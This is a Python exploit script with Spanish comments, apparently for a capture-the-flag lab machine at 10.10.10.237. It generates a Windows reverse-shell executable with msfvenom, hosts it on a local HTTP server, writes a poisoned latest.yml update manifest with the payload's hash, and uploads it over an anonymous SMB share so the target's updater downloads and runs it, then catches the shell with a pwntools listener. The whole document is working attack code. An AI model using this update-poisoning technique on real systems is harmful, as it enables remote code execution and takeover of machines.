#!/usr/bin/python3

import requests, argparse, time
import threading, subprocess, signal, re, os
from pwn import *

# CTRL+C
def def_handler(sig, frame):
    print("\n3x1tTinG...\n")
    exit(1)

signal.signal(signal.SIGINT, def_handler)

# ---- Funciones del programa
def arguments():
    parse = argparse.ArgumentParser()
    parse.add_argument(dest='lhost', type=str, help='IP para generar la reverse shell')
    parse.add_argument(dest='lport', type=int, help='Puerto para generar reverse shell')
    return parse.parse_args()

def main(lhost, lport):
    web_background = subprocess.Popen(["timeout", "30", "python3", "-m", "http.server"])

    if os.path.exists(os.path.basename(exe_file)) == False:
        p1 = log.progress("Generando %s malicioso" % (exe_file))
        os.system('msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%d -f exe -o "%s" > /dev/null 2>&1' % (lhost, lport, exe_file))
        p1.success("✔")

    p2 = log.progress("latest.yml")

    # Abrimos el archivo latest.yml
    yml_path = os.path.abspath(".") + '/latest.yml'
    yml_file = open(yml_path, 'w')

    # Obtenemos el hash del binario
    command_to_hash = 'shasum -a 512 "%s" | cut -d " " -f1 | xxd -r -p | base64 | tr -d "\\n"' % (exe_file)
    hash_sha512 = os.popen(command_to_hash).read()

    # Escribimos contenido en latest.yml
    yml_content = """version: 1.2.3\npath: http://%s:8000/%s\nsha512: %s""" % (lhost, exe_file, hash_sha512)
    yml_file.write(yml_content)
    yml_file.close()

    p2.status("Generado")
    time.sleep(1)

    # Subimos el archivo a la carpeta cliente
    # - https://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient
    os.system("smbclient //10.10.10.237/Software_Updates -U 'null' -N -c 'cd client3; put latest.yml' > /dev/null 2>&1")
    p2.status("Subido")

    time.sleep(1)
    p2.success("✔")

# --------- Inicio del programa
if __name__ == '__main__':
    args = arguments()

    exe_file = "try'now.exe"
    try:
        threading.Thread(target=main, args=(args.lhost, args.lport,)).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(args.lport, timeout=30).wait_for_connection()

    if shell.sock is None:
        log.failure("La conexión no se ha obtenido, ¿haz cambiado el puerto? (el binario debe tener el mismo puerto)")
        log.failure("Borra el que tienes y el programa generará otro... (o simplemente vuelve a ejecutar, RECUERDA QUE ES MUY RANDOM!)")
        exit(1)

    # Borramos archivo para que no se nos vuelva loca la terminal
    os.system("smbclient //10.10.10.237/Software_Updates -U 'null' -N -c 'cd client3; del latest.yml' > /dev/null 2>&1")

    shell.interactive()
